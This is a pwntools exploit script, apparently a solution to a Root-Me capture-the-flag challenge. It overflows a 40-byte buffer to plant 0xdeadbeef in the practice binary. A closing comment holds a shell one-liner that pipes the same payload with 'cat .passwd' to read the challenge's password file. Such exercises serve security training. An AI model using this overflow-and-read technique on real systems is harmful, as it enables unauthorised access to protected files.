#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("app-systeme-ch13@challenge02.root-me.org", 2222)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    payload = flat(b'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj', 0xdeadbeef)
    io.send(payload)

    io.interactive()

if __name__ == "__main__":
    main()

# (python -c 'print "1"*40 + "\xef\xbe\xad\xde"'; echo cat .passwd) | ./ch13
